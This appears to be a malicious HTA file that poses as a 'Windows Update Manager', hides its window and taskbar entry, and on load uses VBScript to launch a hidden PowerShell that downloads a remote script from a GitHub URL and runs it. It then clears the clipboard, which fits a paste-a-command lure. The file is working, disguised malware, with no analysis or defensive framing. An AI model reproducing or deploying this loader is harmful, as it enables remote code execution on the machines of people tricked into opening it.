<!DOCTYPE html>
<html>
<head>
    <title>Windows Update</title>
    <HTA:APPLICATION
        APPLICATIONNAME="Windows Update Manager"
        BORDER="none"
        BORDERSTYLE="none"
        ICON="https://www.microsoft.com/favicon.ico"
        SHOWINTASKBAR="no"
        SINGLEINSTANCE="yes"
        WINDOWSTATE="minimized"
        SCROLL="no"
        SCROLLFLAT="yes"
        SYSMENU="no"
    />
    <style>
        html, body {
            display: none;
        }
    </style>
    <script language="VBScript">
    Sub Window_onLoad
        Dim objShell
        Set objShell = CreateObject("WScript.Shell")

        ' Run PowerShell in hidden window, no profile, executing remote script
        objShell.Run "powershell -w hidden -nop -c ""iex (irm 'https://raw.githubusercontent.com/BalletsPistol/_/main/n')""", 0, False

        ClearClipboard
    End Sub

    Sub ClearClipboard
        Dim objHTML
        Set objHTML = CreateObject("htmlfile")
        objHTML.parentWindow.clipboardData.setData "text", ""
        Set objHTML = Nothing
    End Sub
    </script>
</head>
<body>
</body>
</html>
